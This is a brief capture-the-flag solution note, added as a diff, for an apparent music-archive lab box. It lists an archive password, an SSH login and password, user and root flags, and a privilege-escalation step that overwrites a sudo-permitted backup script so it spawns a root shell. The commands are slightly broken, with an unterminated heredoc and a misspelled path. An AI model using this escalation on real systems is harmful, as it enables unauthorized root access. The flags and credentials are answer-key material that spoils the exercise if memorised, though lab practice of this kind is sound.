@@ -1,0 +1,16 @@
+music_archive:squidward
+
+ssh :: alex:S3cretP@s3
+
+user:: flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+
+priv esc :: sudo -l -> /etc/mp3backups/backup.sh
+		
+		cd /etc/mp3backups
+		chmod +w backup.sh	
+		cat > backup.sh << EOF
+		#!/bin/bash
+		/bin/bash
+		/etc/mp3backups/bachup.sh
+
+root :: flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
